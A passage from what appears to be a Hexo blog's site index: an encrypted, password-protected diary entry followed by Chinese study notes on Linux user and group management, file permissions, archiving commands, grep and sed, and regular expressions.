281ff924ee1289c70f2770e36c0513f9e504f21ac0bdb632a648d68371d8eb3c39010aeec951a165489a50ea290e4f3213e8afd987e628cb89d629a78fcb8fb1460514d558dac62036738ea66e86ee2463bea1a5a79ee4cb68afac15b9547247c3a3507f95c65d941c97ae010d24c7b57de21cc689651e86f7239bdbe036676340f37862cd906fe5fe670ab697f6d4ed415c3bd34d95ec5a874f6e29d28bb452e12e162dfee2fa9ee3b03ebe373a1223104df8b0e7c24527b97a15d2c791665e8fe7e61bb80a0c872bcdfd4016e942053b6a08fbffa7ac34e29b010aa765a22ec192a532e5cde955990000d37a2551ed1317b39958c9e78488bdd668336001e32a47a30a0a58d2c3aaff688d2264b9053bf6b45555bc6d12519c4f3820c2c210bdf75eed03f6ee4b3887120b84a8d5452808e9638ff1c07af87528da803ae969d0eb5a6c02cf9f696caf44408d0708ef7cc6d2bc6ba1c1c045d0c407d85b8036290f5c3fa84a7806569640eab6118c5a8f6ca4e7a071dd0051af59a64eeebfee6f262f1de70ad2e4c5d360e201c05893f0eb59b820c1d1c8ee9d8475675e81a7b571246f35f31da309fcb18f7999b828080d6a35ecf4d695385a929ba0b3e1c54252bf6ea7e46a5abceda681e71d84d0eab04d8bcc40f1b4b0a2edc665c5d2512926c5d5808e51d2db769c30cb902f3f687f2074b4f6718767ae110bdb5846b9593d824bda0c328ba29bd9e418a00b8c95abaa3e7d08215828f70d94c8a963a868941e56a7df7509276edbd939f10238e877348f3384b3332bb02b0cd67903a9654ea81fb71ac9acbd3b352b0b6d13fdabaa84b6e885a021d2a74d5545ed6a55bdd66ea9bd60868230c05b32d5bf995ba00429864a81a85de7d8399212026c9aad4bee36bf150717a29d46fc6e3037eaba55f1750ef653d15caad2e4fd49173c08b16592047b765e3cdaa000b0fadc5ce8a716ec36fff2265935c9e6e8c56a085253db6fd787f61976e4ee72bd3fd6c7d676fea20752a91977577e793c2d975925c537cb0949079629eb6d682b7b333f97fe07a0053210b892c9cf8867f5d12d8b6c58b806b04990bdee1b1e57e63599252857344140fdc5c4e39cb273c72e171aada5b0baaa7f637bcb78158417ac262ab70f15846073f5ed4a33578593e994202238fbcfdcd6c1a2161ee96e834227323b1f99fadb4b612419f5da689fccaf3cc2b07a9d2764c379b48e938541dcbd187ed65c407d96f912eed2b5e1129794b2fe2b111fac380d22752f65ad2c1ec7a271a33069fd2f91c5ae5be21057a86767bf1f75bde6e9a10b037980f3a27ea18c18b65d432f796aa14b89ba8300051f538c95de7f89e52d9eec46b9e09dfe5c21f88b20daece8f40c673e0f5c40bc553e57800eacfe03cae8f7358c31f87d53421b72e9bec3bb7c1f5d0134e55cea2acac5284a2ecf920eb7a225c09e04e4b3eed131a389e5315628de7bc814e6b4e650da622552146690df883a3aea397695b134807165746edf407922997491b79db0ae561161f86508267db4b8868d975f5ff235066215f2c01b2cf404f7ad56a85b23a43aa026f4307c1a5dbd10a9dfa9fc98a420d9f0f45b95a11c5d71b1a54b04d7da59deea9963810bdbb5a2cddeaca262d546e98282a3b3a31031532700e316a716355b9286696b398b0d9d3b8e1651ccae5c41f1c19c26c6ca96eedaec2cc3f97795ea416cfdb9ee0ecc12b686c166b34433d0f103ce9673d558020184c045fb135ac5ad9907f93242d49d03ce02f44be89c2b441eb0e497b56b1e76f748dade9890ac207921b63571642309daec70b7f9305b66ab279468d38775b7f9659c967eb25903fe87f9ce36bb7da87fd6885640814f30dc45d804eb12b8ee38993c2b53edf0c5e95361226a12e68e7fba6164216f6f9afbfdb2365bb53c95223f24c85ea4489aab7f63e54a1775ddc5799c72df081fab2b854fc5202cebce42614efa86d45327a13c96f7c0d5c96d676aaa0240b95e0d9a52a1b64deb0e1207a9b664051b69f837c5a34ad1fbd1250ad1e72cdd8e76b58053520b41e5b1df340fba7388d46032c8f2666f9227d0a893a258c69405b37a19d6fb8ea854019e7ab3f4c7f3a657b87bc1639fbe6e1ed18cb52ad8c75d47a7e4fa9b3fe70ddfd37c600f9e6b7bfa522722920184a430c6f5f5c24d4a3cbef9fa62bbbc65cca72fb6789ff78c447b740948751e6a63d2ac2025ad5b50adce824b14888a5ff4974d6edfeac32b92c1e8895eb1d94c8bc8e69cb47e5b9499c667283895145afe8de4a84ff56ba35c17a7ba1d1d4cc4afd1acf183e8284cd947d3016012b64d5e2b2d589f6911ab7288f2676c14a1c8dced256c1719e879792053335bd3535adf47dd3500e9271c08c94ee17d3fee81caea96ae5ef749ebdcf63df86eea964f73caa14d2cba0fbe70ce4d2e1c351babe9ab4df4d7b2d28227861303cd165430e204417996f27055d7516a6e0b2ca0b3bfa9d181e38ef43e711c797f22e6b626e15bc9d689b79955bda6a2606875639e5cf8343d0f343bdda9998640cd6c56ecbdbcf32d3f1c6f392b252aeaae664b08c83485f099b47138df43ed92382f8888a80bb534ee752be6008b740f50fb8b2d24cadd52a5239755892950a4761a87af87fd179c7fcd76ad4d688a74c858801d8ab4c3da38ece9ad2f3a5f8b2380f15aa4e4eaa8de19598b576ab44d23958f35d8db6ebe94aa7b24886dd7dc006fef54ce5fded62a65e4376dab050352d5a67d1f8442414ffd4d3cf8ae15a91a7d8e68618ebc53e7b8263e1beb63bf52a7410178717abbd189aa2b3c597e5ab90fec7dd7ed30564400d0bca144de25586ee8749cb9ab3e5165075486a16601b0ac1dab9beb6d8f71c93ddd89303f144c3f2ed367d13486812695a73e64d1c64a0914aad651d3c34f85538659de76158191d3449634dd641803996d60222b389e8d3ba9f28a1b6a19dc4c453ed4f551d5bf20f1e56ec23c4d21ba8f69e3c140ba7622eecdf9ae8a9dd5f63ccab0d3dff13c3fcde46cd8f71f3a2abf2e2628907442d2cfc34a7b64aae9a7b30d954855de54e7118f08fb67bacbfdd3c0c96e514ce66269e4786a9a1590f954d63afa01fdb51b9c4d96dddbed6d3b227d6f0981630dd00f0d4d1c36b859a6e998165ae4d3a29f0f238a88901ab85038a9ae6b407ef1e1957602e003eb045003daefb29bf4caca5a5d420d0b7b44084a0bbf9f23531b7abbb35367b60619721f3a5386175fa76221c62cf9682ce3c0a92fca2acb4a132b50fd5feee1197572a904e76ad50382d33518efbb3efb16a1634ff4269fbbb1b3cb28cee3243ee8e9164753b46a3445c22f85efc89c6d803f46088cf607763a42edd3ed505895b92bd8c924d6c391c4f74ebf1eb0f4b8d33a5e1577fb5b39f150463a161edd0a25ef813a8cab564677b07ddf2812cfb1b3c1b4791bd0f8d3149737fa05d3fa111e05b162efa11a2bc75011506a6bb2221b084ae51a10361ca1fb628c0fdb472b4dbdcc66aa38f842af2b4db82444e83c8a7e0314716237a3826398dc7b6b52e79cadfa41f25c9c94551311c1cde306a40f02394fcdf6a7abc3a97279a2c26f7d1f38583acf71ab2c0dbddec6126e682cb5ed9dfe044aab228ff713f25f6d215a1976c78033e58f81f65ba13e96ac0d802bd0a177b4a014e5cdb53d3ae9de4cabeadc692defab54494d839f429e62c1a60e3e2dee864bec6e1d8175b825f19c320aa74b0559c3afba4b0cdff97a8fe4cdb991e8990be8ad9490a8f9e22f1d95c2de4e27ad81a137215ef79d2f4abf192edea6e30df6915fcb95dd5839404a3c2b3f1b39c68ef74cde7ea3407e08d6b7f6346d9389c6169baa6687c81c794805d38be087365a4f0f4d9d98c24301c155704e587edb16b244a330ad755507a282bddbaf759d3fb43bc6edc0b923b23fcc1a487961519471b91ef2865d569fd6982cf99a198eea205e3e3b6898ad3ee2f5bd202630b19665180bfd144d1a6e9f64f698778fe337d72401bb8f32a9c2d73d3472f408797bfaed2e0b705616ee9b8571a4db10f41ef0e24df07c5fe7de0710ad74d39c85fd68b9976d120de72e472531d47b2f249a5408d51aaa96196bbf975f708649927cf3ccc8a97a0466a0ae5ad725a923087db59a3cd88fea944d7a540687bcd214dce8a8a6db6ef29dcc9baf1f55627866a99bac8c10b22948ec827d3758faf8d34c4ff39cba3a27b4d329ed5a22529c14e5645567616f30eeac5d9d28dbe4910d96dc05519e1d5bdbe4a072fd7965fe76a2fa32ca2fbc49bf64dac0fa5ecbe3d0623a9b73d859fe40620ce05ed34d848f8e4562adb749389fb37ee361ec65d37ded7f99d884d962d5fefb15e0e5b9bc2c51262300fdc2077450c09848acce7904d16a7dee9383e5b2508c1aed6ac6707ccc78db6ce264322304dae0d937cdb8d6ea04d4a7c001713890ce59c551060aec15ba54d1a2585b66b544f28d574b3e17389d4698d145ff8d3bd8dedc0f636d2ea631708c69a6363076f76071ace5835d31518f8a052bd646147aeb9f449317475285ae39d6ac2ea8c884e250ddd832d1fd1a8bc48df48e7a784d4c70f790a3f5345f95e75bba6876131b29b31b39c3771dbb04ee3464726ddd984f4d43a60b1d56e9728f371a0d2a74c029cb204caccb2af7098eb497e35d679ddf69b4e3c71fda2d2cce9c669db2ad24b473510c7e9e2663d014ebe2987f92ffdeacf32626bd5102fbe585059cead58265e3e9556b791f30a7ea99f6cb0740b5bf6d3ba1755a97af18b4e08bbcb5775eb832058b855f71a92c84712ce285215aaca216ba273f18bad3e97cce48497ac32ebf7475860bec5eabe6ee75763c991c4e9a6e92984e1d7bfd8c74421481ca9b4b4d3f8cb95c1d75487bd7609c8cb81551e29f78e5dc93ea4d8843ec415f9ca5d7ab312d644dbeb0129b8c96b6e1cfd8d3261ee3b3152e68cbc4b3bee2298104fbaf5887e43096ef70622098c20e30f29ead097c0e4376846697dc889c4d04fe04ec71ca3f97b89bf0513de2072e5bb579905eecbed36986ee04c02c3304371b52df5161c1af73b57b08724fb4005cdd6f3ca7ca32a61f6efafbb03b88cb06ae54edce253e055a9ae1004bce78bd58f141f9c8e59f53b4a45795192391c7057bda6efb59de7ef632f025cc2b7a582345f42aa1708f87a2eaec7ad18ff974f6077ee204f082152e13c3bd02de729afdb4174ebd62f02adcf83b9bb1df31fe4b4c0579a1939c650ab07ec0e6b1690a014068f536d58051d87f16d7b3bf99545ea725d59f3f37d599096a93d91ddf12fdf42cab30c4427c6dc54aadab6d68b888d4c9f7f603b2abbba222ccea07f79b228040b3576d302d4e63f6237d340aadb6eebf879e602cb8fa878d02b42952b6db1831b503b5ae9c7b8b0e4caa9c55b40fdb7e2f3b5d62ec99371316d0144f9328c3bd446adf753e6ae1fb7fed824581c06762039da6e0d78613c17c4d976ccd7e8fffc2e87f521a44734169d8700c055792469728d33513147aa773eaa7361cf1185450de84fbe6e9fe31a1646bcf67408efd9f807ae1616b327f7dc1915a226269c7fe31fcace5413867aa25af147c59d14a05d62ca3006ae75439460b90a1ec0349d4607041eba8b9e778fdb5f8bbba273c8e1d9cb144a04d030298c044dc3484f64b37b752488210384f2756d4ab50295a151807843c85a76108beab2d02261be1dfbf547442f8752cb74601943f5a24aeb2abebbd050b84f6f2c8c0099f3757fdd15c9205661b8dda6983b1b43f5f433d64b294801312a3b443300db718e1b87dff63180edaf1f734b2cdb98b6b0ade317fd548c95dab64ccbb7bb13aceac5c714081d86f38bcc3f3bc09ad5fb233ed1c0806012df859b5eb119913e36d6c2bfdb1c911a9300927059174eea2e36b3cf8cda08eb2047ad216ddc69c6a85a23fbe3109f260d1c45fad439a7a49e04c4642870473f27081b24fc9bc2b73f45fddef5de108d7d5259df06e8ad98f5adf57c57dfd842643c44a6c5ada0dbc090462aa82e64dc01d1bee8f010b2f87546de437307fe075ef83d8379c6f197e0d86f06bc91a98b4943f238a7c9af8dd317a4e092e7b5c40e6e19c43ab9aa3dfcd504e825c6c8f0c2ffe87ea9741123b6262febc86081ea7995e5dbb78ef69209a99ab21409ee6e33b2966f39b6d2fea71317aaa7e893c915d8b7cbe96ddddd9983b04298064b3320bad000abc78ace430d2ac324464cd8b3efdf620c45c525334b41aca96766b5579ac07433ad6a0b8f4f62da4b041189cfeeeb92af3d91ee10a02f39d94640717a806d9d590f025c937743ac648800b3f6f38ac79b0fa276cb71a4404ceb3990341ca697b4f70565010247df659f6c51e6415a905b7873aa5056633d31f83bce7569c895af476c320f06a008f352c8bc3c380cbf9724f2b4451322ffdf9038c33fb53d93b124676e41cc935fd9cc9fa374b8432cda935b3c09aa8b6b4e010f99751e2966f984fabc2eebc53de4f4d599bf2cd560922d4b2231dc6284d36b321abf971a752428ecde0971ffbf575399900ce20d031a9567e300db0572927a4c4137688e6bcb8c4b1a7d033d1327721769ce6d5734e0ef4b63ef12cc9005f4dc8bf16cd1de28bc7c0f09a485a4312e25819d2b32edf85ee375d4458cbc74f88f13ee1f603b3a9cdbf48fdbabe2316967091c425a2fcec9eefdc92e10a0139ee31417fcd0fb792a72bdb186502b9a2cf8a3c2cf88ad6308822e66073bb1950912a0d61ac2fc7e9b95ea0cab3d5ca0e8609d48f959a574a5718cd2e62628b86dfc1124f7288a3fc1e2d865290602e91042e63baba35c412646c06e8a9d1088d0d915e58a4a2a8e37582ef46e300ed9ec2b2242d2e755b3a9a15920c994aa61ff2e0ba636b09b8850733c1e886670e7827bd2c9eb99d12a6588b60a5c2a16d0d559e4351a487a120a662c3e971e64537288c521ebd887c8a9c3b2dee27fbef2f6b28e01a4d478b9a3348bc0698dde592fc852e8de36b19bb425edbe2cbc336065fb13d5bb48556b8314935adf9d4f42c82968175a5f3f6d1e924c98e8eafd94b58239a7aacdd46a513129241e7e7e5f8d24db8af71141296396ff05a59f54d541282b001b3b5fc3214ed7ef43b1506ee4bc822a032cbfe5f8153e3b4f05b02ac35bee1f9ed8e0b2e9f0ba362cd3322d53ad1f444a96e63fe45a39e11be29c8fc8211eeba82090586b2d6c1b02b175a0ee65ef7b47e1e0bb9f6ead627d1dbface73c4e7f4014c62577c70234aac698615a4719b046457bbf5002aa060807f28989d4961baecac6ba8f3582c99f717e7770f4c43fa8a189f0790371030b542a9cb2efabc439d6d05d31df0adb3cf2075736257438b850baeb66c77064557c109167edf3fa0d8b6081264aaa2ef17fe2c8e562899ec0ae0933f1f8cd70d1593a1a2ecd372600b3e88fa645acce5b8f780a6bbedaeba57b65079ead86741937a2f86a361ef1bb788d6e735c50a424241e8ace3132c2402cb5acb2e93427d814bc17e68d48c1d7115e3f774736f254c4dfb2a6d42c23cfe7ba06b7363488fa1bdce447aef34df3dafc09ece9bee44cce80f79d532a101f7ef1b7a5d1800ae39d4940f539f026f9cef7abfadd87e3b113482bc21baca80d0c19cf46deb584e661f19016527b6e0f2764115cd51e3c6d563408894086b89f73e94a7c9a7b5443c85817a0350d3116d74ad4ea1615fd42d54bfc02306af962c517153bc05c158ea6302e849cdd5eee6d392626c76f2db6fb8e19051bd645e4a4da470ff5bd12d27f0b15d0b5ee662a57c8af1b91b134215febcca0f62d3d26e0a1b4db4c3f40588fc215d62642da2b5542aea4342886e3b39ab1776a1fecc643c9f1b048b0c747bf0e74cbaa774d5b76a8cb0f888272152b1d083f71a8ede2ae245bead36197168ad19b1fdbe4c3a99b153ebcd96582bf8a2f0a9e92b1c68d0ff67901dee37ff357a053a76b565ca89ee22e2deb6f2ab8f33b0be64247835170a09accbeb3b6c5aabca27796569296293948ae11a3436226a23a67a134020513af891a98ff0c139ef70f5fdb8583732d4d3b626cf0a6958dbebebd4615c15289efc45183faf50d456ed31e4d1a77812fcf1faee36fbed7e1f0df431a021aeb74cd17243388173bc2521bc5dab2e3feb5c63ae2faf51ac1c777b12eb513f47955689ae9d17009c62fc718dc2a14ab2dd099f528c4149ae434be1baeff3c340c98d0dc1926654b0b8f02d7114f604a78c19b5102e3e18968a980511d2e8a143c2be2975708ec0023796108f34af64f2d66658e64c8775bb72fd82d41c2171786b770a72d9aaa59f1110b5727dc8a42183acac45a3de0d99106b2a972e679ac4cb28441e81be2816617dd724306ec968c42575169bd1434a29653cab8b6c6678fc8795c5408778dc9d67ce5031534b51564be3eb68315f388a24feeae101dba7a03197169fc9b6f4b01e376dc1f544a7f2c32b760ae16b92ac1b381102a44a9e0e9bd42a48cec85668f81a191084e35f3a038b1d87104bbbcedb83d1565e8eb93de029b9f167b0cd6796b042b9042301b502080a50517cdce9214de4d54fc9ab2095322a0c4ebf3c9975842d4bb2c1185312a42319db42eede683322f32c961a08736c1f407980e4f8c2b26bddd1e072c46e0ff11fd1425edc0c0fee5795976d9486e6c9e96c67be9268ee8d889e5665179343096e26601d1b8da911ed11f026e99a28a1ddd7f3ea1d833711651c68e733974253d3cf4be7378a6e88ef3e532e8bc697e857b85bc157337327cf93ada33470c8ad2bf36a9f90b58eff1f7d1158b3518b61122a09fd0cc3460543224eb9adba9ee492bc6bcc2659fc5733366c364991e015f7f31fef9f3c6b24de9c52b9d8d1a80b56dc63651a7a0d08b2b6164fa7eae8b7376a4751b6dc3c897d27cefaa6d13f829dec2371b4d105d19740b8dcbd1d30cf3396f6ff1086bab4afc5b903f59d2fc33f69da6d2b0d43cd69c691aa95202f4df3c9b5484640384d8c9f37f3e71c44ea423f919738d9729d053fa91a86921f85cf67ee8e03ab6fbdb9e8930298123d58195f148180198408b4d761fbf38568fbec425f4f1f68b7467f7d1a1a12e633918be03e098e283ff1ea6407b31899815383ed6525a762b67f14a30848c2f47d41068cbca0cb7420a0525c56e958962c99eb04c4b0e56a8e034b13b4742b8cabed8fdd51566b098d1a5cc646c797975f337ebd4fd0cbd05d00c9b4e01fd9b674a2752882a7e25777a2236461bf0029937a4320daf398310b35ca158beffb96a6b09c2b09c4b13a13af0daaf30b0f9ede6b6558d7c142df00f384d81af59f8ed6d2624c8baccde791910f765150fcc28b3727f8156c8dbcdeadb593571cd50412cfcbcb2f965670e6c398aca5470e79f1d00d70a01842b147b88457c502c39f8d08e02bf45de6360eb086b80a844127fddfabe16329c3e7c2e0e33ed355c6bc0de77fa867a6757e588e31ecab1025d43033ccfffe30ae1d18d4449a4665e9b2215e06171cf7fbc23bc617a5341badfa7b391688d8a6ea3ddf4219d583f40616a69e5e04f770bc30f874d9e6fde5a622e4b189616314f0522e3595bd288979f8c7ebf8f51148112e9a63949e35ead9ce0472dc8c35340c0561a255c48df0a7297de1085d66781b3f77eb13ba61cbe88ca269e972ca62ba93574e72d6d27e78a5b81680e1eb4cc6ae7f66c06d438fdf85e8ebdeda2df10dc03844831f56dd5c70af3a75afacd2943d5038a3e78d5f58736a70bfed6af0f4d9ea50f7808b711e302948689cc007159866f5cca00d19141381b51a84ba0d0e1405f17135c13e7550bdf9ab54224180786e11ff0a9888068fbcaf3b86a250920bd904a0330ea6cf08b7da34b7fff0cc493a443add416e0145183d4a9e1ae6a9b7a0b4f1e9bee318c416b27bc71d5f617b141f3168788efc80a34c41228ffb133c5969cb935669105a46a0517dc0e1c977fb2e01fe9400330af25415c94e5f6652d612f44e34a375b10c6b22186edcba02517bc89b8fef7afe49ef53d72c4b0ed8d552efc31645a7739975181ebe5536a6633ce5107461fda6d6e13dc5d5358b9f723de48403cd7ed6433083db6ef9f0705547a0219fdc0384156481e9a3a1b1cab8bc1e6108adbba9d4e9e0c7fc53303b6afe76afe8bb0e24d90fb3ce9b9415d2f7d6f98a77b434ac559970e39d3706c73751d9969be420472627e6d55a3b9ea3c5d3beac84e81a9c1c191358f26ecb44143e262af87cc5f9a849b7b5a698e877097946eac0c6f2f318dd5c9dbedd18a13dc5d48de7d9ef5a3ebdaf7baade32bf7ee1cad70c8b20f4d17fbb2876a2633b7a61dec2164194b83f257a6089dcf73cd0d9730413618650c6d23f25df060421f3e2bb5fd42f8ca40afc492d70a262d2da5eef77c4adcaebf5ad60161c46190666a94d10f04f226dd60f228606175fc47283504ee9be622270261ed5e0588d40166b5b0604f57671b7f665911e3180adf881c43d4ffb4dd0dcfc4ed26a4ab529eacfc8335297594a0c87b2eb2642f64e6f424deab30a22bb5d5fbfe82ade055722e604ec41a0146b57c2f04b221abb4b61e997a117adeb87a5b30f621d499544169a8fabf4f59930b3db4dd2ebd138d546b554125119a78cce9274e74ddd320004a6d3dfb83daac9e57d6d545450e40d686aec4e9dad1d043c7f5e206b58f5cc5867bcf701f07682fed9333f29510e3734a3006ba9a99dfe11688e4527da58662a98aa0122d89b22fff832763f2b72e36780912682874a0f7b98adc97ea9d8083a1e473039db7b65b6370a2f466b6051207c612bb6ad712e0d585322c44c8616cd189a4475a670c59b48ab69a1858c752a0a0cc3561eba876e8f8cb88afaf28bf288d3d16fed18deea020112eeedfc916ee199263251fb91cb7ad91162facd68bf64a01a12def827af3b699cb2926cde2951464af6e348489fed825e66dc7a5681395f86b64dfba1252f1af3c81a646aafbfd1660354a99c689255a5b0e86148f24fa114db207bc422503891efcf4590f18a68c711c889b9698d2bdf17b8661d9ea1bfbe532e8fc28988836bb34bfe5161a051a82da5495ccc0238540af00645d86e536f1960c5d53bd30e0ff817b3d0a6e4b415bf400dcf00bdda2eb7e5d9ff297accb286d459b59c297d498fd7cdf41c06862db915b1939ffc7b6b37498c213da47023a24ead90469cc51fe6bbf8dab62a5efc00ea5f9ce7459315db49df5eb98</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云计算相关笔记（整理中……）</title>
      <link href="2023/04/04/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BA%91%E8%AE%A1%E7%AE%97%E7%AC%94%E8%AE%B0/"/>
      <url>2023/04/04/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BA%91%E8%AE%A1%E7%AE%97%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="day3-用户组管理"><a href="#day3-用户组管理" class="headerlink" title="day3 用户组管理"></a>day3 用户组管理</h2><p>linux：多用户多任务，可同时运行且不会互相影响</p><p>root用户：排错，查看日志，系统日常维护</p><p>www：修改网页程序，只需要对网页中的程序做修改的网页程序员</p><p>ftp用户：可以把文件图片传到服务器上的权限，比如美工，图片</p><p>mysql用户：DBA 数据库管理员，所有用户送一个月会员</p><p>不同用户使用不同的权限</p><hr><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>uid（用户id） gid（组id） /etc/passwd(x代表该用户有密码但不是真正密码，后面数字分别为uid和gid)</p><p>uid</p><p>0 超级用户</p><p>1-499 系统用户（伪用户，保留给系统使用）1-99由系统自己创建，其余分配给有系统需求的用户</p><p>500-65535 普通用户 linux2.6以上内核支持2^36,可以放一个小国家的用户量</p><hr><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p>用户名：加密的密码（sha512，以前是md5和des ）：最后一次修改时间：最小修改时间间隔：密码有效期：密码过期后宽限时间：账号失效时间：保留字段（没什么用）</p><p>可以用root给任意用户修改密码</p><hr><h3 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h3><p>用户组配置文件</p><p>组名：组密码（放在/etc/gshadow）：组id：组用户</p><h3 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="etc/gshadow"></a>etc/gshadow</h3><p>组密码</p><p>组名：加密密码（一般不设置）：组管理员：组附加用户list </p><hr><p><strong>useradd</strong> xiaoyao 创建用户时会自己创建一个独立的xiaoyao组，也会自动创建一个home目录(centos会自动创建，和<strong>adduser</strong>一样)，ubuntu中useradd不会自动创建用户，adduser会</p><p><strong>passwd</strong> xiaoyao</p><p><strong>groupadd</strong> users 新增一个叫users的组</p><p><strong>usermod -G users xiaoyao</strong> 把xiaoyao用户添加到users用户组中</p><p><strong>groups</strong> 显示当前用户所在组</p><p><strong>groups xiaoyao</strong> 显示xiaoyao这个用户所在组</p><p><strong>usermod -G root xiaoyao</strong> 把xiaoyao从上面的users组<strong>换</strong>到root组中</p><p><strong>userdel -r xiaoyao</strong>删除用户和对应的home目录</p><p>useradd -u 1020 -g 1001 -c “this is a test user1” -d /home/test1 -G user1 test1 添加用户id为1020，组id为1001，用户注释-c，指定test1用户目录，-G把test1用户也加到user1组中（此时就不会自动生成test1的用户组）</p><hr><h3 id="UGO权限"><a href="#UGO权限" class="headerlink" title="UGO权限"></a>UGO权限</h3><p>文件的权限</p><p>r=4,w=2,x=1 -=0,</p><p>rw- r– r–  U G O user group others</p><p>chmod 777 xiaoyao.txt</p><p>chmod u+x xiaoyao.txt      g+-     g+x  </p><p><strong>chown</strong> [用户名] xiaoyao.txt 修改文件或目录所属用户</p><p><strong>chown</strong> :[组名] xiaoyao.txt 修改文件或用户的所属组</p><p><strong>chown [-R] 所有者:所属组 文件或目录</strong>   -R递归，同时更改</p><p>shown [属主]:[属组] [目标文件]</p><h2 id="day4-压缩打包等"><a href="#day4-压缩打包等" class="headerlink" title="day4 压缩打包等"></a>day4 压缩打包等</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf  wenjianjia.tar.gz  wenjianjia 把文件夹打包</span><br><span class="line">tar -xzvf  wenjianjia.tar.gz 解压到当前目录</span><br></pre></td></tr></table></figure><p>zip -r test.zip ./test 把当前文件夹下的test文件夹及其子文件递归压缩命名为test.zip</p><p>unzip test.zip  可以用win的打包成zip格式用linux解压，错误有可能是网络下载不全，压缩包损坏</p><h2 id="day5-crontab-grep-sed-awk"><a href="#day5-crontab-grep-sed-awk" class="headerlink" title="day5 crontab-grep sed awk"></a>day5 crontab-grep sed awk</h2><p>计划任务</p><p>文本三剑客</p><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>grep正则表达式必须要用大写的E，小写-e无效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">status_log=$(cat /etc/nginx/nginx.conf | grep -E &#x27;[^#](access|error)_log&#x27; | wc -l)</span><br><span class="line"><span class="meta">#</span><span class="bash">排除掉以<span class="comment">#开头的</span></span></span><br><span class="line">WhoisNginx=$(cat /etc/nginx/nginx.conf | grep -E &#x27;^user&#x27; | awk &#x27;&#123; print $2 &#125;&#x27; | sed &#x27;s/[;]//g&#x27;) #只匹配以^user开头的，此处用[^#]来排除#user情况不可取，正则表达式没问题，但是这里就是匹配不到，可能是user一般都在开头，在开头导致的？</span><br></pre></td></tr></table></figure><h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>动作文本编辑器</p><p>a新增</p><p>c取代（*<em>change</em>）</p><p>d删除</p><p>i插入</p><p>p打印</p><p>s正则取代（<em>substitution</em>）</p><p>q退出sed</p><p><strong>sed -e ‘4a\newline1’ test1.txt</strong> 在test.txt文本的第4行后面添加newline1文本</p><p><strong>nl test1.txt</strong>发现第四行并没有新增，nl带上行号输出</p><p>cat test.txt 也没有，说明sed并不会真的修改，只是打嘴炮</p><p>nl /etc/passwd | <strong>sed ‘2,5d’</strong> 输出并把第二行到第五行删除</p><hr><p>cd /etc/se</p><p>cat /etc/selinux/config 一般会把selinux关闭，最大程度最小权限的一种安全机制，但有时候和UAC一样烦人，造成ssh，frp连接不成功等情况</p><p>sed ‘s/SELINUX=enforcing/SELINUX=disabled/g’ /etc/selinux/config 修改参数（打嘴炮）</p><p>sed -i ‘s/SELINUX=enforcing/SELINUX=disabled/g’ /etc/selinux/config 用-i参数插入，就真修改，不再打嘴炮</p><p>删除某一个字符串可写为：sed ‘s/原字符串//g’</p><p>更多参考<a href="https://blog.csdn.net/ltochange/article/details/119729369">https://blog.csdn.net/ltochange/article/details/119729369</a></p><p><a href="https://blog.csdn.net/L1259863243/article/details/79364094">https://blog.csdn.net/L1259863243/article/details/79364094</a></p><p><a href="https://blog.csdn.net/m0_58292366/article/details/124586128">https://blog.csdn.net/m0_58292366/article/details/124586128</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>（来自高阶）70%常用表达式</p><p>sublime可支持正则查找</p><p>\w 匹配所有字母，不匹配符号</p><p>\w\w\w 匹配三个连续的字母</p><p>\w{5}匹配连续5个字母</p><p>\w+ 匹配所有整块字符</p><p>\s 匹配空格</p><p>^xy 以xy为<strong>段落的开头</strong>，中括号内是非的意思</p><p>[^xy]* 排除x和y元素，以x或y为分割匹配所有</p><p>xy!$ 以xy!为段落结尾</p><p>\b 单词界定符，必须搭配\w使用，\b\w{3}\b 在\w{3}基础上去除phone这种就不会被识别为pho</p><p>\d 数字界定符，可以匹配单个数字</p><p>\d{11} 11位的电话号</p><p>\d{4}-\d{4}匹配1234-5678这种格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\(\d&#123;3&#125;\)\d&#123;4&#125;-\d&#123;4&#125; 匹配(010)1234-5678 括号用\转义，这里的\d其实也是把字母d转义为有意义的数字匹配</span><br></pre></td></tr></table></figure><p>贪婪匹配（尽可能多的匹配）</p><p>*匹配0次或多次</p><p>\w* 除了符号以外，不管字母后面有多少个字母，都给匹配，可以简单地理解为乘法</p><p>+匹配1或多次</p><p>.点号，匹配除了换行符以外的所有单字符</p><p>\w.* 除换行符以外的字符重复了0次或多次，此时匹配一段话，基本上点星代表匹配了所有</p><p>?前面的表达式出现了0次或1次，</p><p>\转义字符</p><p>（）括号是选择，（com|net|org）配合|或者选择匹配</p><p>\w+@\w+.(com|org) 实际中匹配邮箱比这个更严格</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\[.*?\] 